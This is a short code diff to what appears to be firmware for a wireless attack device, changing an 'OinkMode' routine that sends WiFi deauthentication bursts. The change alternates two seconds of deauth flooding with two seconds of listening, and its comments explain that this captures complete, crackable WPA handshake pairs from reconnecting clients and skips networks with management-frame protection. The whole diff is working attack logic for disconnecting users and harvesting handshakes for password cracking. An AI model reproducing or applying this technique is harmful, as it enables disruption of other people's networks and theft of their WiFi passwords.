@@ -1136,8 +1136,16 @@ void OinkMode::update() {
                     break;
                 }
 
-                // Send deauth burst every 180ms (optimal rate per research - prevents queue saturation)
-                if (now - lastDeauthTime > 180) {
+                // Duty-cycle the deauth: hammer for 2s to knock clients off, then
+                // go QUIET for 2s so the client's reconnect 4-way handshake can
+                // complete without us stepping on it. Continuous deauth only ever
+                // catches fragments (M1+M3 or M2+M4) and never a full crackable
+                // M1+M2 / M2+M3 pair — the listen window is what lands handshakes.
+                uint32_t attackPhase = (now - attackStartTime) % 4000;
+                bool listenWindow = (attackPhase >= 2000);
+
+                // Send deauth burst every 180ms (optimal rate - prevents queue saturation)
+                if (!listenWindow && now - lastDeauthTime > 180) {
                     // Skip if PMF (shouldn't happen but safety check)
                     if (targetHasPMF) {
                         selectionIndex++;
